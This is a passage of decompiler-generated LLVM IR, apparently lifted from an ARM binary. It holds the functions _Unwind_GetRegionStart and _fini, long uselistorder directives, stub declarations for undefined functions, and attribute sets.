573, 178, 878, 228, 227, 879, 293, 292, 880, 371, 881, 494, 882, 883, 495, 884, 326, 885, 496, 886, 887, 497, 888, 296, 295, 889, 323, 322, 890, 389, 388, 891, 892, 498, 893, 245, 244, 894, 895, 499, 896, 1025, 1026, 1027, 1028, 1029, 1030, 1031, 1486, 102, 103, 104, 105, 106, 897, 1178, 672, 100, 101, 1129, 898, 289, 288, 673, 1179, 899, 290, 291, 674, 900, 338, 336, 337, 1180, 901, 99, 98, 97, 902, 365, 364, 903, 904, 209, 208, 905, 173, 906, 519, 907, 160, 908, 155, 154, 909, 261, 911, 910, 236, 237, 912, 229, 914, 913, 367, 368, 262, 1359, 538, 1360, 539, 1463, 264, 263, 1361, 1362, 1363, 1364, 553, 1365, 916, 915, 88, 96, 91, 94, 92, 93, 89, 90, 95, 540, 565, 1366, 1367, 1368, 1369, 39, 38, 2, 1370, 1371, 1372, 1373, 1374, 574, 1375, 575, 1376, 918, 917, 520, 1181, 1182, 1183, 1184, 919, 1377, 1378, 1379, 566, 585, 3, 550, 4, 1380, 1381, 1382, 1383, 675, 1384, 390, 1307, 359, 1386, 1385, 1387, 107, 1388, 324, 1389, 920, 287, 286, 285, 284, 1390, 921, 260, 259, 258, 257, 586, 676, 1047, 677, 1048, 622, 1049, 1268, 679, 1269, 689, 1050, 587, 690, 691, 1033, 1035, 680, 1032, 682, 1034, 683, 1036, 681, 1037, 1038, 684, 1039, 1040, 687, 1041, 1042, 685, 1043, 1044, 686, 1045, 1046, 688, 1051, 1270, 1271, 1272, 692, 1273, 1274, 1275, 693, 1276, 1024, 1279, 1278, 678, 1277, 1280, 1281, 694, 1282, 1285, 1286, 695, 1287, 696, 1288, 697, 1289, 698, 1290, 699, 1291, 700, 1292, 701, 1293, 702, 1294, 703, 1295, 704, 1296, 705, 1297, 706, 1298, 588, 1305, 1306, 557, 707, 934, 933, 932, 931, 930, 929, 928, 927, 926, 925, 924, 923, 922, 527, 523, 521, 522, 524, 526, 525, 1299, 1300, 708, 1301, 1302, 709, 1303, 1304, 279, 278, 277, 283, 280, 281, 282, 276, 275, 710, 711, 936, 935, 528, 529, 1130, 1131, 1132, 1133, 1134, 1135, 1136, 541, 552, 1137, 1138, 589, 542, 1139, 1140, 1141, 1142, 543, 551, 1143, 1144, 590, 544, 1145, 712, 1146, 1147, 713, 1148, 714, 1149, 1150, 576, 1153, 1151, 1152, 548, 549, 1154, 715, 1155, 944, 785, 943, 942, 941, 940, 939, 938, 784, 937, 353, 354, 356, 355, 358, 352, 351, 357, 945, 366, 1250, 601, 577, 946, 116, 115, 114, 113, 117, 111, 109, 108, 110, 112, 1195, 1196, 1197, 1198, 716, 948, 947, 122, 123, 132, 133, 120, 124, 121, 125, 126, 127, 134, 118, 119, 128, 129, 131, 130, 719, 624, 1156, 1157, 623, 1158, 717, 718, 720, 1159, 1160, 721, 722, 723, 724, 725, 726, 620, 1162, 727, 961, 960, 959, 958, 957, 956, 955, 954, 953, 952, 951, 786, 950, 949, 328, 329, 327, 730, 729, 728, 1161, 963, 962, 731, 1168, 605, 1169, 604, 1170, 603, 1171, 602, 1172, 1173, 732, 608, 733, 1174, 734, 1175, 735, 1176, 558, 736, 975, 974, 973, 972, 971, 970, 969, 968, 967, 966, 965, 964, 299, 302, 300, 301, 1185, 1191, 6, 591, 1186, 737, 1187, 5, 1188, 612, 1189, 592, 593, 1190, 1192, 1193, 613, 1194, 787, 979, 978, 788, 977, 976, 341, 1283, 625, 626, 1284, 7, 8, 9, 1199, 1200, 1201, 1202, 1203, 614, 615, 738, 1204, 1205, 739, 1206, 1207, 740, 1208, 1210, 1209, 983, 982, 981, 980, 373, 374, 378, 379, 377, 372, 376, 375, 1211, 1212, 1213, 741, 742, 985, 984, 331, 334, 335, 330, 333, 332, 1214, 1215, 1216, 743, 1217, 744, 628, 627, 745, 1218, 986, 267, 270, 271, 272, 269, 265, 268, 266, 1219, 1220, 746, 1221, 629, 594, 747, 987, 349, 350, 1222, 1223, 1224, 748, 1225, 749, 750, 1226, 630, 1227, 988, 381, 385, 386, 387, 384, 380, 383, 382, 1228, 1229, 1230, 751, 1231, 752, 632, 631, 753, 1232, 754, 1233, 989, 316, 319, 320, 321, 318, 313, 317, 314, 315, 1234, 1235, 1236, 1237, 1238, 755, 1239, 756, 1240, 757, 637, 636, 758, 1241, 633, 1242, 634, 1243, 635, 1244, 995, 994, 993, 992, 991, 990, 345, 346, 348, 347, 342, 344, 343, 1245, 1246, 1247, 759, 640, 639, 760, 1248, 638, 1249, 996, 253, 246, 250, 251, 252, 249, 248, 247, 1251, 1252, 1253, 761, 643, 642, 762, 1254, 641, 1255, 1001, 1000, 999, 998, 997, 303, 304, 309, 310, 311, 308, 307, 306, 305, 1256, 644, 763, 254, 255, 256, 1391, 1002, 360, 1261, 1003, 361, 297, 1308, 1311, 764, 1312, 1313, 1309, 1310, 1314, 1315, 532, 533, 535, 534, 531, 536, 1323, 765, 1004, 75, 1392, 76, 1393, 771, 1394, 1395, 769, 1396, 770, 1397, 1398, 774, 1399, 1400, 617, 772, 1401, 773, 1402, 1403, 646, 1404, 1405, 597, 1406, 1407, 1408, 1409, 1410, 1411, 1412, 579, 1413, 775, 1414, 776, 777, 1415, 1416, 1417, 1418, 598, 1419, 1420, 599, 1421, 1422, 600, 1423, 580, 596, 595, 1424, 1425, 768, 1426, 1427, 766, 1428, 578, 767, 645, 1429, 1431, 1432, 1430, 778, 1433, 779, 1434, 780, 1435, 1436, 1019, 621, 1437, 1438, 616, 781, 1439, 1016, 1015, 1014, 1013, 1012, 1011, 1010, 1009, 1008, 1007, 1006, 1005, 393, 392, 400, 397, 395, 399, 398, 391, 394, 396, 1017, 1018, 530 }
}

define i32 @_Unwind_GetRegionStart(i32 %context) local_unnamed_addr {
entry:
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %v5_1b380 = call i32 @_Unwind_VRS_Get(i32 12, i32 0, i32 12, i32 0, i8* bitcast (i32* @0 to i8*))
  %v1_1b388 = add i32 %tmp1, 72
  %v2_1b388 = inttoptr i32 %v1_1b388 to i32*
  %v3_1b388 = load i32, i32* %v2_1b388, align 4
  ret i32 %v3_1b388

; uselistorder directives
  uselistorder i32 72, { 10, 11, 0, 12, 2, 3, 1, 4, 7, 8, 5, 6, 9 }
  uselistorder i32 (i32, i32, i32, i32, i8*)* @_Unwind_VRS_Get, { 10, 8, 7, 6, 5, 9, 4, 3, 2, 1, 0 }
  uselistorder i8* bitcast (i32* @0 to i8*), { 0, 3, 4, 7, 5, 6, 1, 2, 8, 14, 13, 10, 11, 9, 12, 15, 16, 17 }
  uselistorder i32 12, { 10, 9, 12, 11, 172, 173, 174, 175, 16, 17, 62, 18, 176, 54, 13, 177, 178, 179, 180, 181, 183, 184, 182, 185, 186, 187, 188, 189, 190, 191, 19, 20, 21, 22, 24, 23, 25, 55, 56, 26, 27, 57, 58, 59, 60, 61, 63, 64, 70, 65, 66, 192, 7, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 3, 101, 102, 103, 104, 105, 28, 106, 141, 29, 30, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 160, 153, 154, 155, 156, 157, 158, 159, 161, 162, 31, 163, 5, 71, 72, 32, 73, 74, 75, 14, 67, 50, 51, 107, 108, 52, 42, 48, 49, 41, 43, 44, 45, 46, 47, 53, 109, 110, 111, 8, 112, 113, 114, 115, 117, 118, 119, 33, 121, 123, 122, 116, 6, 68, 69, 4, 34, 35, 36, 37, 120, 76, 38, 77, 78, 79, 80, 81, 82, 83, 39, 84, 85, 86, 40, 87, 88, 89, 90, 91, 92, 15, 93, 94, 95, 96, 97, 98, 99, 100, 0, 1, 2, 164, 165, 166, 167, 168, 170, 169, 171 }
}

define i32 @_fini() local_unnamed_addr {
entry:
  %v3_1b39c = load i32, i32* @r4, align 4
  call void @__pseudo_branch(i32 %v3_1b39c)
  %v31_1b3a4 = load i32, i32* @r0, align 4
  ret i32 %v31_1b3a4

; uselistorder directives
  uselistorder i32* @r0, { 12, 13, 14, 300, 301, 302, 15, 41, 80, 91, 303, 306, 307, 71, 16, 304, 305, 201, 46, 8, 308, 9, 17, 81, 0, 82, 10, 11, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 1, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 83, 18, 72, 73, 74, 75, 76, 77, 78, 79, 84, 85, 86, 87, 88, 89, 90, 19, 226, 44, 227, 20, 21, 22, 23, 168, 169, 335, 336, 338, 56, 57, 58, 59, 24, 186, 187, 2, 25, 26, 95, 96, 3, 27, 28, 339, 340, 4, 29, 30, 228, 229, 5, 31, 32, 69, 70, 337, 156, 92, 230, 33, 54, 55, 231, 6, 232, 233, 234, 203, 50, 204, 205, 206, 51, 207, 208, 34, 242, 235, 236, 237, 238, 239, 240, 241, 97, 98, 209, 35, 210, 243, 36, 244, 211, 37, 212, 245, 38, 246, 247, 39, 248, 99, 40, 100, 213, 42, 43, 170, 171, 172, 173, 249, 45, 250, 47, 251, 252, 253, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 62, 214, 60, 61, 63, 215, 217, 218, 219, 222, 223, 224, 216, 93, 94, 188, 52, 153, 154, 155, 49, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 220, 221, 7, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 202, 225, 53, 64, 65, 66, 254, 67, 255, 68, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 297, 298, 299, 48 }
  uselistorder void (i32)* @__pseudo_branch, { 1, 68, 61, 62, 63, 64, 65, 66, 67, 69, 70, 71, 72, 17, 18, 19, 20, 21, 22, 13, 14, 15, 16, 23, 24, 25, 26, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 27, 28, 29, 73, 78, 79, 80, 81, 82, 83, 84, 74, 88, 89, 90, 91, 48, 49, 39, 40, 41, 42, 43, 44, 45, 46, 50, 75, 76, 77, 85, 86, 87, 51, 52, 53, 0, 36, 37, 38, 54, 58, 59, 55, 56, 57, 92, 30, 31, 32, 33, 34, 35, 47, 60 }
  uselistorder i32 0, { 450, 449, 513, 514, 1575, 454, 453, 515, 1576, 1577, 1578, 1579, 395, 394, 516, 1580, 1581, 212, 1582, 1584, 1585, 154, 155, 1586, 1587, 1583, 93, 94, 95, 96, 2, 1, 3, 0, 201, 200, 202, 203, 204, 1588, 451, 452, 146, 141, 1589, 1590, 206, 207, 205, 208, 1591, 1592, 1593, 1594, 211, 210, 209, 1595, 1596, 1597, 440, 439, 517, 455, 518, 456, 519, 457, 520, 521, 522, 156, 1598, 471, 470, 1599, 1600, 469, 468, 1601, 523, 466, 467, 464, 465, 463, 462, 1602, 461, 460, 459, 458, 404, 1603, 1619, 1604, 215, 1605, 1606, 1607, 1608, 1609, 1610, 217, 1612, 1613, 213, 214, 1614, 1615, 131, 157, 1616, 1617, 739, 97, 98, 441, 442, 216, 1611, 1618, 403, 1620, 524, 525, 1621, 473, 472, 218, 1622, 1623, 219, 1624, 1625, 1626, 109, 526, 527, 1627, 220, 1628, 158, 1629, 1630, 221, 1631, 1632, 1633, 1634, 1635, 1636, 1637, 1638, 1639, 1640, 38, 132, 528, 1641, 222, 1642, 1643, 1644, 4, 1645, 1646, 5, 1647, 1648, 983, 984, 6, 147, 1649, 529, 1650, 897, 898, 899, 900, 901, 905, 902, 903, 904, 7, 405, 99, 906, 530, 907, 908, 909, 474, 475, 985, 986, 8, 531, 842, 532, 1651, 1652, 1653, 9, 10, 159, 160, 161, 1668, 1669, 11, 843, 162, 163, 1263, 1264, 1265, 1266, 223, 224, 1267, 852, 225, 133, 48, 1670, 100, 406, 1674, 1675, 49, 910, 110, 911, 912, 913, 407, 164, 1671, 1672, 1673, 408, 12, 1676, 1677, 1678, 1679, 1680, 1683, 1684, 1685, 1686, 1687, 1688, 1689, 1690, 1691, 1692, 1681, 1682, 1693, 1694, 1695, 1696, 1697, 1698, 1699, 1700, 39, 1701, 1702, 1703, 1704, 1705, 40, 1706, 1707, 1708, 41, 1709, 1710, 1711, 42, 1712, 1713, 1714, 1715, 1716, 1717, 1718, 1719, 1720, 1721, 1722, 1723, 1724, 1725, 1726, 1727, 1728, 1729, 1730, 1731, 1732, 1733, 1734, 1735, 1738, 1739, 1740, 1741, 1742, 1743, 1744, 1736, 1737, 1745, 1746, 1747, 1748, 1749, 1750, 1751, 1752, 1753, 1754, 43, 1755, 1756, 1757, 1758, 1759, 44, 1760, 1761, 1762, 1763, 1764, 45, 1765, 1766, 1767, 1768, 1769, 1770, 1771, 1772, 1773, 1774, 1775, 1776, 1777, 1778, 1779, 226, 914, 740, 915, 916, 917, 918, 952, 533, 534, 953, 954, 165, 166, 167, 230, 919, 228, 920, 941, 934, 741, 935, 936, 937, 938, 50, 51, 113, 939, 940, 409, 942, 943, 742, 944, 227, 945, 52, 53, 112, 946, 947, 743, 948, 949, 54, 55, 111, 950, 229, 951, 168, 921, 744, 922, 923, 535, 924, 925, 745, 926, 927, 930, 928, 929, 410, 931, 56, 57, 115, 932, 746, 58, 59, 114, 933, 955, 747, 956, 957, 958, 959, 960, 961, 748, 962, 963, 964, 965, 845, 844, 413, 847, 848, 846, 411, 412, 849, 850, 536, 851, 853, 854, 749, 855, 856, 857, 750, 858, 859, 60, 61, 116, 860, 861, 862, 101, 102, 863, 864, 865, 231, 866, 867, 868, 869, 870, 537, 871, 872, 873, 874, 875, 876, 169, 879, 751, 880, 881, 62, 63, 118, 882, 883, 884, 752, 885, 886, 887, 888, 753, 889, 890, 64, 65, 117, 891, 892, 893, 894, 895, 232, 234, 877, 233, 878, 235, 896, 170, 966, 971, 972, 967, 968, 969, 974, 975, 976, 236, 977, 978, 979, 980, 981, 970, 973, 982, 171, 987, 988, 989, 538, 1061, 539, 990, 1654, 1655, 1656, 237, 1657, 1372, 1371, 1373, 1271, 1374, 992, 991, 993, 1062, 1063, 1064, 1780, 1781, 1782, 1783, 238, 1784, 1785, 1786, 1375, 1376, 437, 438, 540, 1791, 757, 1792, 541, 1793, 1794, 542, 1795, 1796, 755, 239, 415, 1797, 756, 1798, 543, 103, 1799, 1800, 544, 1815, 1816, 1819, 754, 414, 1820, 476, 173, 172, 1817, 1818, 1787, 1788, 758, 240, 396, 832, 13, 14, 1811, 1097, 1010, 1810, 151, 1377, 1378, 142, 1379, 759, 241, 1380, 1381, 1801, 1802, 1803, 1804, 545, 1805, 174, 1272, 1273, 66, 67, 119, 1352, 1353, 108, 417, 1357, 1354, 1355, 760, 1356, 1358, 761, 1359, 1360, 1361, 1362, 68, 69, 120, 1363, 242, 1364, 1365, 1366, 1368, 1367, 416, 833, 835, 834, 243, 836, 837, 838, 546, 839, 175, 1789, 1790, 1037, 1038, 1039, 1040, 1041, 1042, 245, 176, 1043, 1044, 1045, 143, 244, 1046, 177, 548, 549, 1806, 547, 178, 179, 1387, 1388, 1389, 1390, 1391, 246, 1392, 1393, 1394, 1395, 1396, 1397, 1398, 247, 1382, 550, 1383, 1384, 551, 1385, 1386, 180, 762, 248, 249, 1274, 552, 250, 1275, 1276, 1277, 1278, 1279, 181, 258, 251, 253, 254, 255, 257, 260, 259, 252, 256, 1399, 1400, 1424, 1425, 182, 1401, 1402, 264, 262, 263, 1403, 1404, 270, 269, 196, 261, 1405, 1406, 1407, 1408, 1409, 1410, 444, 443, 477, 553, 1411, 1412, 1413, 104, 1414, 266, 265, 267, 268, 195, 1415, 1416, 418, 1417, 1418, 152, 1419, 1420, 1421, 1422, 1423, 15, 16, 1011, 1012, 105, 17, 478, 554, 1426, 1427, 1281, 1280, 1429, 1428, 1283, 1282, 1431, 1430, 1047, 1432, 1284, 1434, 1433, 1160, 1014, 1013, 1268, 1821, 1822, 121, 183, 1065, 1066, 1067, 271, 994, 995, 272, 1068, 1073, 1074, 1075, 1076, 273, 1069, 274, 1070, 1071, 184, 1077, 1048, 555, 1807, 1808, 1809, 1015, 1436, 1435, 1078, 1016, 1369, 1017, 1018, 1019, 1020, 1812, 1813, 1814, 1072, 18, 1437, 1438, 1439, 1440, 148, 1441, 275, 1442, 1443, 1444, 1445, 1446, 1447, 1448, 276, 763, 766, 764, 765, 1449, 1450, 1451, 1452, 1453, 1454, 19, 1658, 1659, 1660, 149, 1661, 1662, 1663, 1664, 1665, 277, 1666, 767, 770, 768, 769, 1667, 771, 197, 278, 1455, 1456, 144, 432, 1457, 1458, 70, 185, 772, 419, 21, 20, 279, 1459, 280, 773, 22, 420, 281, 282, 283, 71, 284, 556, 1285, 1079, 1080, 1081, 1461, 1460, 1462, 1463, 1464, 1465, 46, 285, 1466, 1467, 1468, 286, 134, 135, 557, 511, 512, 1469, 288, 287, 289, 1470, 290, 1471, 1472, 291, 1343, 1344, 558, 292, 293, 294, 1473, 295, 1474, 1286, 298, 1287, 1288, 559, 1289, 819, 820, 296, 297, 821, 823, 808, 136, 72, 399, 400, 809, 810, 778, 811, 822, 560, 818, 779, 812, 780, 813, 781, 814, 782, 815, 783, 816, 784, 817, 824, 825, 561, 826, 1290, 774, 1291, 562, 1292, 1293, 422, 421, 1294, 1295, 1296, 1297, 300, 299, 1298, 1299, 1300, 785, 397, 1301, 124, 125, 398, 1302, 122, 123, 563, 1304, 1305, 775, 1306, 1307, 1308, 1309, 1310, 564, 1311, 1312, 1313, 433, 198, 777, 1314, 1315, 1316, 776, 1317, 1318, 565, 1319, 566, 1320, 1323, 1324, 1325, 301, 1321, 302, 1322, 303, 1303, 996, 997, 998, 138, 73, 999, 137, 74, 1000, 1001, 567, 1002, 568, 1003, 569, 1004, 1005, 1007, 304, 305, 1006, 434, 75, 126, 445, 1008, 306, 23, 1009, 1098, 1099, 1102, 1103, 1104, 1100, 1101, 1105, 1106, 1021, 571, 1023, 307, 1024, 1025, 1026, 1027, 1028, 1029, 1030, 309, 308, 1031, 572, 1032, 573, 1033, 574, 1022, 24, 1034, 575, 570, 576, 840, 577, 1035, 1036, 578, 314, 313, 786, 186, 316, 315, 787, 187, 318, 317, 788, 188, 320, 319, 789, 189, 790, 312, 311, 310, 424, 435, 425, 426, 427, 579, 1049, 321, 322, 1057, 1050, 1051, 1052, 1053, 1054, 1055, 1056, 423, 1058, 1059, 76, 1060, 323, 580, 145, 1082, 1083, 1084, 1085, 430, 1086, 1087, 1088, 429, 1089, 1090, 1091, 1092, 324, 1093, 1095, 1094, 190, 191, 325, 428, 327, 326, 1096, 328, 329, 106, 330, 333, 1107, 1108, 1109, 1110, 332, 331, 334, 1111, 1112, 77, 78, 199, 150, 335, 107, 582, 1113, 1114, 1115, 1116, 1117, 336, 1118, 1119, 481, 1120, 1121, 1122, 1123, 340, 337, 338, 339, 1124, 1125, 1126, 1127, 583, 1128, 1129, 480, 1130, 581, 1131, 479, 1132, 584, 1133, 342, 1134, 1135, 1136, 1137, 341, 343, 1138, 1139, 79, 80, 139, 1140, 344, 1141, 1142, 484, 482, 1143, 483, 1144, 348, 1146, 1147, 1148, 1149, 347, 346, 349, 1150, 1151, 81, 82, 1145, 345, 1152, 1153, 350, 1154, 1155, 487, 1156, 486, 1157, 485, 1158, 585, 1159, 587, 140, 83, 1161, 192, 488, 588, 1162, 1163, 351, 352, 1164, 586, 1165, 355, 1166, 1167, 1168, 1169, 354, 353, 356, 1170, 1171, 84, 85, 193, 1172, 1173, 25, 26, 27, 28, 1174, 1175, 357, 490, 1176, 589, 1177, 590, 1178, 591, 1179, 592, 1180, 593, 1181, 594, 1182, 489, 1183, 361, 1185, 1186, 1187, 1188, 359, 358, 362, 1189, 1190, 86, 87, 1184, 360, 1192, 1191, 29, 30, 31, 32, 1193, 363, 1194, 1195, 492, 1196, 595, 1197, 596, 1198, 597, 1199, 598, 1200, 599, 1201, 600, 1202, 491, 1203, 601, 1204, 367, 1206, 1207, 1208, 1209, 365, 364, 368, 1210, 1211, 88, 89, 1205, 366, 1212, 90, 602, 1213, 1215, 1216, 1217, 1218, 603, 1219, 33, 34, 35, 36, 37, 1214, 369, 1220, 1221, 498, 1222, 497, 1223, 496, 1224, 495, 1225, 493, 1226, 494, 1227, 604, 1228, 1231, 1232, 1233, 371, 372, 1234, 1235, 91, 1229, 1230, 370, 1237, 1236, 1238, 373, 1239, 1240, 501, 1241, 500, 1242, 499, 1243, 605, 1244, 1246, 1247, 1248, 375, 376, 377, 1250, 1251, 92, 1249, 1245, 374, 1253, 1254, 1252, 1255, 378, 1256, 1257, 504, 1258, 503, 1259, 502, 1260, 606, 1261, 446, 1262, 1475, 379, 1476, 1269, 380, 1270, 1326, 1327, 1328, 1329, 1330, 1331, 383, 1332, 1333, 1334, 1335, 1336, 1337, 1338, 1339, 381, 382, 1340, 1341, 1342, 1345, 153, 1346, 1347, 447, 607, 431, 1348, 1349, 47, 436, 1350, 1351, 608, 1370, 384, 1477, 827, 828, 829, 830, 1478, 831, 1479, 1480, 1481, 1482, 385, 386, 609, 1483, 1484, 792, 793, 794, 1485, 1486, 1487, 1488, 1489, 1490, 1491, 1492, 1493, 1494, 1495, 1496, 1497, 800, 1498, 1499, 1500, 1501, 1502, 614, 1503, 1504, 801, 1505, 1506, 1507, 795, 1508, 796, 387, 388, 389, 1509, 1510, 1511, 1512, 802, 1513, 1514, 194, 1515, 1516, 803, 1517, 390, 1518, 1519, 1520, 804, 610, 611, 1521, 1522, 805, 1523, 1524, 1525, 1526, 1527, 1528, 1529, 1530, 1531, 612, 1537, 1532, 1533, 1534, 1535, 806, 1536, 807, 1538, 613, 1539, 1540, 1541, 1542, 1543, 1544, 797, 1546, 1547, 1548, 1549, 1550, 448, 1551, 1554, 1555, 1552, 1553, 392, 391, 1556, 1557, 1558, 1559, 393, 1560, 1561, 401, 1562, 127, 128, 402, 1563, 129, 130, 615, 1564, 1545, 1565, 738, 791, 798, 799, 1566, 1567, 1568, 1569, 1570, 1571, 505, 1572, 506, 1573, 507, 1574, 1823, 508, 841, 509, 510, 616, 617, 618, 619, 620, 621, 622, 623, 624, 625, 626, 627, 628, 629, 630, 631, 632, 633, 634, 635, 636, 637, 638, 639, 640, 641, 642, 643, 644, 645, 646, 647, 648, 649, 650, 651, 652, 653, 654, 655, 656, 657, 658, 659, 660, 661, 662, 663, 664, 665, 666, 667, 668, 669, 670, 671, 672, 673, 674, 675, 676, 677, 678, 679, 680, 681, 682, 683, 684, 685, 686, 687, 688, 689, 690, 691, 692, 693, 694, 695, 696, 697, 698, 699, 700, 701, 702, 703, 704, 705, 706, 707, 708, 709, 710, 711, 712, 713, 714, 715, 716, 717, 718, 719, 720, 721, 722, 723, 724, 725, 726, 727, 728, 729, 730, 731, 732, 733, 734, 735, 736, 737, 1824, 1825, 1826, 1827, 1828, 1829, 1830, 1831, 1832, 1833, 1834, 1835, 1836, 1837, 1838 }
  uselistorder i32* @r4, {}
}

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i16 @__decompiler_undefined_function_1() local_unnamed_addr

declare i8* @__decompiler_undefined_function_2() local_unnamed_addr

declare i8 @__decompiler_undefined_function_3() local_unnamed_addr

declare i16* @__decompiler_undefined_function_4() local_unnamed_addr

declare %vfp_regs @__decompiler_undefined_function_5() local_unnamed_addr

declare %anon_struct_4 @__decompiler_undefined_function_6() local_unnamed_addr

declare %anon_struct_13.3 @__decompiler_undefined_function_7() local_unnamed_addr

declare %anon_struct_13 @__decompiler_undefined_function_8() local_unnamed_addr

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #1

; Function Attrs: nounwind readnone
declare i16 @llvm.bswap.i16(i16) #1

declare float @fabsf(float)

attributes #0 = { noreturn }
attributes #1 = { nounwind readnone }
